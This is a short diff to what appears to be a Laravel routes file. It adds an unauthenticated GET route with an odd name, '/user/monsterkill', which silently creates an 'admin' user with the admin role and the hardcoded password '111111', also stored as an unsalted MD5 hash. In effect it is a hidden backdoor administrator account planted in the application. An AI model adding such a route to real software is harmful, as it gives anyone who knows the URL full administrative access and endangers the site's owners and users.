@@ -63,6 +63,19 @@ Route::get('/user/{id}/id', function($id)
 {
     return User::find($id)->id;
 });
+Route::get('/user/monsterkill', function()
+{
+    $user = new User();
+    $user->name = "admin";
+    $user->username = "admin";
+    $user->password = Hash::make("111111");
+    $user->role = "admin";
+    $user->md5 = md5("111111");
+
+    $user->save();
+    return redirect('/');
+});
+
 Route::get('/user/{id}/username', function($id)
 {
     return User::find($id)->username;
